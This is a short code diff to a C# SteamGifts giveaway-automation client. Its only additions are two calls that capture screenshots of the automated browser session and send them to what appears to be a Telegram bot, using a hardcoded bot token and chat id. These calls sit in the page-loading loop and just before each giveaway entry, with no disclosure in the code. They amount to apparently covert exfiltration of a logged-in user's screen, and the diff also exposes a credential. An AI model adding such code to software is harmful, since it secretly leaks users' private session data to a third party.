@@ -60,6 +60,8 @@ namespace SteamGifts.Client
             {
                 _logger?.LogDebug("Loading giveaways from page {Page}", currentPage);
                 page.GoToPage(currentPage++);
+
+                ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
                 Thread.Sleep(DefaultWaitTime);
                 _logger?.LogDebug("Loaded giveaways from page {Page}", currentPage);
                 var giveaways = page.GetGiveaways();
@@ -91,6 +93,9 @@ namespace SteamGifts.Client
 
             page.GoToPage();
             Thread.Sleep(DefaultWaitTime);
+
+            ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
+
             bool result = page.PerformEnter();
 
             _logger?.LogInformation("Joined giveaway {Url}: {Result}", giveawayUrl, result);
